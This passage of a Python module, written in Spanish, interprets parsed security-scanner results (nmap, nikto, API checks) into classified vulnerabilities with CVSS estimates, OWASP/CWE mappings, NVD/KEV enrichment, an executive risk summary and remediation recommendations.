        print(f"    Bases de datos: {len(self.technologies['bases_datos'])}")
    
    def _process_vulnerabilities(self) -> None:
        """
        Procesa y clasifica todas las vulnerabilidades detectadas.
        """
        print("\n[*] Procesando vulnerabilidades...")
        
        # Procesar indicadores OWASP Web Top 10 (fuentes: nmap, headers, gobuster, nikto)
        for indicator in self.data.get("indicadores_owasp_top10", []):
            if indicator.get("fuente") == "api_security_checker":
                vuln = self._create_vulnerability_from_api_checker(indicator)
            else:
                vuln = self._create_vulnerability_from_indicator(indicator)
            if vuln:
                self.vulnerabilities.append(vuln)

        # Procesar vulnerabilidades de Nikto
        for nikto_vuln in self.data.get("vulnerabilidades_nikto", []):
            vuln = self._create_vulnerability_from_nikto(nikto_vuln)
            if vuln:
                self.vulnerabilities.append(vuln)
        
        # Procesar errores HTTP
        for error in self.data.get("errores_http", []):
            if error.get("codigo") in [500, 501, 502, 503]:
                vuln = {
                    "id": f"HTTP-ERROR-{error.get('codigo')}",
                    "titulo": f"Error HTTP {error.get('codigo')}",
                    "descripcion": f"El servidor retorna error {error.get('codigo')}: {error.get('mensaje')}",
                    "severidad": "baja",
                    "cvss_score": 2.0,
                    "owasp_category": "A05:2021 - Security Misconfiguration",
                    "fuente": "curl_verbose",
                    "evidencia": error,
                    "recomendacion": "Configurar páginas de error personalizadas que no revelen información del servidor"
                }
                self.vulnerabilities.append(vuln)
    
    def _create_vulnerability_from_indicator(self, indicator: Dict[str, Any]) -> Dict[str, Any]:
        """
        Crea una vulnerabilidad estructurada desde un indicador OWASP.
        """
        tipo = indicator.get("tipo", "unknown")
        severidad = indicator.get("severidad", "media")
        
        vuln = {
            "id": f"IND-{len(self.vulnerabilities) + 1}",
            "titulo": self._get_vulnerability_title(tipo),
            "descripcion": indicator.get("descripcion", indicator.get("contexto", "")),
            "severidad": severidad,
            "cvss_score": self._calculate_cvss_score(severidad, tipo),
            "owasp_category": indicator.get("owasp_category", "A05:2021 - Security Misconfiguration"),
            "fuente": indicator.get("fuente", "unknown"),
            "evidencia": indicator,
            "recomendacion": self._get_recommendation_for_type(tipo)
        }
        
        return vuln
    
    def _create_vulnerability_from_nikto(self, nikto_vuln: Dict[str, Any]) -> Dict[str, Any]:
        """
        Crea una vulnerabilidad estructurada desde hallazgo de Nikto.
        """
        descripcion = nikto_vuln.get("descripcion", "")
        severidad = self._determine_nikto_severity(descripcion)
        
        vuln = {
            "id": nikto_vuln.get("id_osvdb", f"NIKTO-{len(self.vulnerabilities) + 1}"),
            "titulo": descripcion[:100] + "..." if len(descripcion) > 100 else descripcion,
            "descripcion": descripcion,
            "severidad": severidad,
            "cvss_score": self._calculate_cvss_score(severidad, "nikto"),
            "owasp_category": self._map_nikto_to_owasp(descripcion),
            "fuente": "nikto",
            "ubicacion": nikto_vuln.get("ubicacion", ""),
            "evidencia": nikto_vuln,
            "recomendacion": "Revisar y remediar según la naturaleza específica de la vulnerabilidad"
        }
        
        return vuln
    
    def _classify_risks(self) -> None:
        """
        Clasifica los riesgos por severidad.
        """
        self.risk_summary = {
            "critica": 0,
            "alta": 0,
            "media": 0,
            "baja": 0,
            "total": len(self.vulnerabilities)
        }
        
        for vuln in self.vulnerabilities:
            severidad = vuln.get("severidad", "media")
            if severidad in self.risk_summary:
                self.risk_summary[severidad] += 1
    
    def _generate_executive_summary(self) -> Dict[str, Any]:
        """
        Genera un resumen ejecutivo del análisis.
        """
        total_vulns = len(self.vulnerabilities)
        criticas = self.risk_summary.get("critica", 0)
        altas = self.risk_summary.get("alta", 0)
        
        # Calcular nivel de riesgo general
        if criticas > 0:
            nivel_riesgo = "CRÍTICO"
            color = "rojo"
        elif altas > 3:
            nivel_riesgo = "ALTO"
            color = "naranja"
        elif altas > 0 or self.risk_summary.get("media", 0) > 5:
            nivel_riesgo = "MEDIO"
            color = "amarillo"
        else:
            nivel_riesgo = "BAJO"
            color = "verde"
        
        return {
            "nivel_riesgo_general": nivel_riesgo,
            "indicador_color": color,
            "total_vulnerabilidades": total_vulns,
            "vulnerabilidades_criticas": criticas,
            "vulnerabilidades_altas": altas,
            "puertos_expuestos": self.attack_surface.get("puertos_expuestos", 0),
            "endpoints_descubiertos": self.attack_surface.get("endpoints_descubiertos", 0),
            "principales_riesgos": self._get_top_risks(3),
            "recomendacion_general": self._get_general_recommendation(nivel_riesgo)
        }
    
    def _generate_recommendations(self) -> Dict[str, List[str]]:
        """
        Genera recomendaciones de mitigación a corto, mediano y largo plazo.
        """
        criticas = [v for v in self.vulnerabilities if v.get("severidad") == "critica"]
        altas = [v for v in self.vulnerabilities if v.get("severidad") == "alta"]
        medias = [v for v in self.vulnerabilities if v.get("severidad") == "media"]
        
        recommendations = {
            "corto_plazo": [],
            "mediano_plazo": [],
            "largo_plazo": []
        }
        
        # Corto plazo (inmediato) - Vulnerabilidades críticas
        if criticas:
            recommendations["corto_plazo"].append(
                f"URGENTE: Remediar {len(criticas)} vulnerabilidad(es) crítica(s) inmediatamente"
            )
            for vuln in criticas[:3]:  # Top 3
                recommendations["corto_plazo"].append(
                    f"- {vuln.get('titulo')}: {vuln.get('recomendacion', 'Remediar inmediatamente')}"
                )
        
        # Headers de seguridad faltantes
        missing_headers = [v for v in self.vulnerabilities if "missing_security_headers" in v.get("titulo", "")]
        if missing_headers:
            recommendations["corto_plazo"].append(
                "Implementar headers de seguridad HTTP (HSTS, X-Frame-Options, CSP, etc.)"
            )
        
        # Mediano plazo - Vulnerabilidades altas
        if altas:
            recommendations["mediano_plazo"].append(
                f"Remediar {len(altas)} vulnerabilidad(es) de severidad alta"
            )
        
        recommendations["mediano_plazo"].extend([
            "Actualizar componentes de software a versiones más recientes",
            "Implementar autenticación multifactor (MFA) en paneles administrativos",
            "Realizar auditoría de configuraciones de seguridad",
            "Implementar rate limiting en endpoints críticos"
        ])
        
        # Largo plazo - Mejoras estructurales
        recommendations["largo_plazo"].extend([
            "Implementar un programa de gestión de vulnerabilidades continuo",
            "Establecer políticas de hardening para servidores y aplicaciones",
            "Implementar WAF (Web Application Firewall)",
            "Desarrollar plan de respuesta a incidentes",
            "Implementar monitoreo y logging centralizado",
            "Realizar pentesting periódico (trimestral o semestral)",
            "Capacitación en seguridad para el equipo de desarrollo",
            "Implementar análisis de seguridad en CI/CD pipeline"
        ])
        
        return recommendations
    
    # Métodos auxiliares
    
    def _get_port_risk_reason(self, port: int) -> str:
        """Retorna la razón por la cual un puerto es considerado crítico."""
        port_risks = {
            21: "FTP - Protocolo sin cifrado, credenciales en texto plano",
            22: "SSH - Objetivo común de ataques de fuerza bruta",
            23: "Telnet - Protocolo inseguro sin cifrado",
            3306: "MySQL - Base de datos expuesta directamente",
            3389: "RDP - Objetivo de ransomware y ataques remotos",
            5432: "PostgreSQL - Base de datos expuesta directamente",
            27017: "MongoDB - Base de datos NoSQL expuesta",
            6379: "Redis - Cache/DB en memoria sin autenticación por defecto"
        }
        return port_risks.get(port, "Puerto potencialmente sensible")
    
    def _check_version_vulnerability(self, software: str, version: str) -> bool:
        """Verifica si una versión de software es potencialmente vulnerable."""
        # Lógica simplificada - en producción integrar con CVE databases
        version_lower = version.lower()
        
        if "apache" in software.lower():
            # Versiones antiguas de Apache
            if any(old in version_lower for old in ["2.2", "2.0", "1."]):
                return True
        
        if "nginx" in software.lower():
            # Versiones antiguas de Nginx
            if any(old in version_lower for old in ["1.0", "1.1", "1.2", "1.3", "1.4"]):
                return True
        
        return False
    
    def _get_vulnerability_title(self, tipo: str) -> str:
        """Genera un título descriptivo para un tipo de vulnerabilidad."""
        titles = {
            "missing_security_headers": "Headers de Seguridad HTTP Faltantes",
            "information_disclosure": "Divulgación de Información Sensible",
            "ruta_sensible_expuesta": "Ruta Administrativa/Sensible Expuesta",
            "VULNERABLE": "Vulnerabilidad Detectada por NSE Scripts",
            "ssl_vulnerable": "Vulnerabilidad en Configuración SSL/TLS"
        }
        return titles.get(tipo, f"Vulnerabilidad: {tipo}")
    
    def _calculate_cvss_score(self, severidad: str, tipo: str) -> float:
        """Calcula un score CVSS aproximado basado en severidad y tipo."""
        base_scores = {
            "critica": 9.5,
            "alta": 7.5,
            "media": 5.0,
            "baja": 2.5
        }
        
        score = base_scores.get(severidad, 5.0)
        
        # Ajustar según tipo
        if "sql injection" in tipo.lower() or "rce" in tipo.lower():
            score = min(10.0, score + 1.0)
        elif "xss" in tipo.lower():
            score = min(10.0, score + 0.5)
        
        return round(score, 1)
    
    def _get_recommendation_for_type(self, tipo: str) -> str:
        """Retorna recomendación específica según tipo de vulnerabilidad."""
        recommendations = {
            "missing_security_headers": "Agregar headers: Strict-Transport-Security, X-Frame-Options, X-Content-Type-Options, Content-Security-Policy",
            "information_disclosure": "Eliminar o ofuscar headers que revelen información del servidor (X-Powered-By, Server version)",
            "ruta_sensible_expuesta": "Restringir acceso mediante autenticación, IP whitelisting o eliminar si no es necesario",
            "ssl_vulnerable": "Actualizar a TLS 1.2 o superior, deshabilitar cifrados débiles"
        }
        return recommendations.get(tipo, "Revisar y remediar según mejores prácticas de seguridad")
    
    def _determine_nikto_severity(self, description: str) -> str:
        """Determina severidad de vulnerabilidad de Nikto basado en descripción."""
        desc_lower = description.lower()
        
        if any(word in desc_lower for word in ['critical', 'sql injection', 'rce', 'remote code', 'authentication bypass']):
            return "critica"
        elif any(word in desc_lower for word in ['high', 'xss', 'csrf', 'password', 'credential']):
            return "alta"
        elif any(word in desc_lower for word in ['medium', 'disclosure', 'misconfiguration']):
            return "media"
        else:
            return "baja"
    
    def _enrich_educational(self) -> None:
        """
        Enriquece cada vulnerabilidad con contenido educativo:
        CWE, '¿por qué es peligroso?', ejemplo de payload, remediación y cheat sheet.
        La búsqueda tiene tres niveles de prioridad:
          1. Tipo de indicador directo (missing_security_headers, ssl_vulnerable…)
          2. Categoría OWASP API (API1:2023…)
          3. Categoría OWASP Web (A01:2021…) — usado para alertas ZAP y nikto
        """
        enriched = 0
        for vuln in self.vulnerabilities:
            tipo       = vuln.get("tipo", "")
            owasp_api  = vuln.get("owasp_api_category", "")
            owasp_web  = vuln.get("owasp_category", "")

            edu = None

            # 1. Coincidencia directa por tipo de indicador
            if tipo in self.EDUCATIONAL_DATA:
                edu = self.EDUCATIONAL_DATA[tipo]

            # 2. Coincidencia por categoría OWASP API
            if not edu and owasp_api in self.EDUCATIONAL_DATA:
                edu = self.EDUCATIONAL_DATA[owasp_api]

            # 3. Coincidencia por prefijo OWASP Web (e.g. "A03:2021 - Injection" → "A03:2021")
            if not edu and owasp_web:
                for key in self.EDUCATIONAL_DATA:
                    if key.startswith("A") and len(key) >= 7 and owasp_web.startswith(key[:7]):
                        edu = self.EDUCATIONAL_DATA[key]
                        break

            if edu:
                vuln.setdefault("por_que_peligroso", edu["por_que_peligroso"])
                vuln.setdefault("ejemplo_payload",   edu["ejemplo_payload"])
                vuln.setdefault("como_remediarlo",   edu["como_remediarlo"])
                vuln.setdefault("cheat_sheet_url",   edu["cheat_sheet_url"])
                vuln.setdefault("cwe",               edu.get("cwe", ""))
                enriched += 1

            # Añadir CWE desde OWASP_WEB_CWE si sigue sin CWE
            if not vuln.get("cwe") and owasp_web:
                for key, cwe in self.OWASP_WEB_CWE.items():
                    if owasp_web.startswith(key[:7]):
                        vuln["cwe"] = cwe
                        break

        if enriched:
            print(f"    [EDU] {enriched} vulnerabilidades enriquecidas con datos educativos")

    def _enrich_with_vuln_db(self) -> None:
        """
        Enriquece cada vulnerabilidad con datos actualizados de NVD y CISA KEV.
        Si VulnDB no está disponible o no hay red, continúa sin enriquecimiento.
        """
        if not self.vuln_db:
            return

        import re
        kev_count = 0
        enriched_count = 0

        for vuln in self.vulnerabilities:
            # Buscar CVE en el título, descripción o campo cve_id
            text = " ".join([
                vuln.get("titulo", ""),
                vuln.get("descripcion", ""),
                vuln.get("id", ""),
            ])
            cve_match = re.search(r"CVE-\d{4}-\d{4,7}", text, re.IGNORECASE)
            if not cve_match:
                vuln.setdefault("is_in_kev", False)
                continue

            cve_id = cve_match.group(0).upper()
            vuln["cve_id"] = cve_id

            try:
                enriched = self.vuln_db.enrich_finding(vuln)
                if enriched.get("is_in_kev"):
                    kev_count += 1
                enriched_count += 1
            except Exception:
                vuln.setdefault("is_in_kev", False)

        if enriched_count > 0:
            print(f"    [VulnDB] {enriched_count} hallazgos enriquecidos con NVD/CISA KEV")
        if kev_count > 0:
            print(f"    [VulnDB] {kev_count} CVE(s) en CISA KEV — explotados activamente")

    def _create_vulnerability_from_api_checker(self, indicator: Dict[str, Any]) -> Dict[str, Any]:
        """
        Crea una vulnerabilidad estructurada desde un hallazgo del APISecurityChecker.
        Preserva el mapeo OWASP API Top 10 2023 y añade CWE.
        """
        check_id = indicator.get("tipo", "API-UNKNOWN")
        severidad = indicator.get("severidad", "media")
        cvss = indicator.get("cvss_score", self._calculate_cvss_score(severidad, check_id))

        vuln = {
            "id": f"API-{len(self.vulnerabilities) + 1:03d}",
            "titulo": indicator.get("titulo", self._get_vulnerability_title(check_id)),
            "descripcion": indicator.get("descripcion", ""),
            "severidad": severidad,
            "cvss_score": cvss,
            "owasp_api_category": indicator.get("owasp_api_category", check_id),
            "owasp_category": indicator.get("owasp_web_category", "A05:2021 - Security Misconfiguration"),
            "cwe": self.API_TO_CWE.get(check_id, "CWE-200 — Exposure of Sensitive Information"),
            "fuente": "api_security_checker",
            "estado": indicator.get("estado", "posiblemente_vulnerable"),
            "evidencia": indicator.get("evidencia", {}),
            "recomendacion": indicator.get("recomendacion", "Revisar y remediar según OWASP API Security Top 10 2023"),
        }
        return vuln

    def _map_nikto_to_owasp(self, description: str) -> str:
        """Mapea vulnerabilidad de Nikto a categoría OWASP Top 10."""
        desc_lower = description.lower()
        
        if any(word in desc_lower for word in ['sql injection', 'xss', 'injection']):
            return "A03:2021 - Injection"
        elif any(word in desc_lower for word in ['authentication', 'password', 'login']):
            return "A07:2021 - Identification and Authentication Failures"
        elif any(word in desc_lower for word in ['directory', 'admin', 'access']):
            return "A01:2021 - Broken Access Control"
        elif any(word in desc_lower for word in ['configuration', 'header', 'server']):
            return "A05:2021 - Security Misconfiguration"
        elif any(word in desc_lower for word in ['outdated', 'version', 'vulnerable']):
            return "A06:2021 - Vulnerable and Outdated Components"
        else:
            return "A05:2021 - Security Misconfiguration"
    
    def _get_top_risks(self, limit: int = 3) -> List[str]:
        """Retorna los principales riesgos detectados."""
        # Ordenar por severidad y score CVSS
        sorted_vulns = sorted(
            self.vulnerabilities,
            key=lambda x: (
                {"critica": 4, "alta": 3, "media": 2, "baja": 1}.get(x.get("severidad"), 0),
                x.get("cvss_score", 0)
            ),
            reverse=True
        )
        
        return [v.get("titulo", "Unknown") for v in sorted_vulns[:limit]]
    
    def _get_general_recommendation(self, nivel_riesgo: str) -> str:
        """Retorna recomendación general según nivel de riesgo."""
        recommendations = {
            "CRÍTICO": "Se requiere acción inmediata. El sistema presenta vulnerabilidades críticas que deben ser remediadas de forma urgente antes de continuar operaciones.",
            "ALTO": "Se recomienda priorizar la remediación de vulnerabilidades. El sistema presenta riesgos significativos que deben abordarse en el corto plazo.",
            "MEDIO": "Se recomienda planificar la remediación de vulnerabilidades detectadas. Aunque el riesgo no es crítico, debe abordarse en el mediano plazo.",
            "BAJO": "El sistema presenta un nivel aceptable de seguridad. Se recomienda mantener monitoreo continuo y aplicar las mejores prácticas sugeridas."
        }
        return recommendations.get(nivel_riesgo, "Revisar hallazgos y aplicar recomendaciones.")


if __name__ == "__main__":
    # Ejemplo de uso del intérprete
    import sys
    
    print("=" * 60)
    print("SCAN AGENT - INTERPRETER MODULE")
    print("=" * 60)
    
    # Cargar datos parseados
    json_file = "parsed_data.json"
    
    try:
        with open(json_file, 'r', encoding='utf-8') as f:
            parsed_data = json.load(f)
        
        # Crear intérprete y analizar
        interpreter = VulnerabilityInterpreter(parsed_data)
        analysis = interpreter.analyze()
        
        # Guardar análisis
        output_file = "analysis.json"
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(analysis, f, indent=2, ensure_ascii=False)
        
        print(f"\n[OK] Análisis guardado en: {output_file}")
        
        # Mostrar resumen
        print("\n" + "=" * 60)
        print("RESUMEN EJECUTIVO")
        print("=" * 60)
        resumen = analysis.get("resumen_ejecutivo", {})
        print(f"Nivel de Riesgo: {resumen.get('nivel_riesgo_general')}")
        print(f"Total Vulnerabilidades: {resumen.get('total_vulnerabilidades')}")
        print(f"Críticas: {resumen.get('vulnerabilidades_criticas')}")
        print(f"Altas: {resumen.get('vulnerabilidades_altas')}")
        
    except FileNotFoundError:
        print(f"\n[ERROR] No se encontró el archivo {json_file}")
        print("Ejecuta primero parser.py para generar los datos")
        sys.exit(1)
    except Exception as e:
        print(f"\n[ERROR] {str(e)}")
        sys.exit(1)
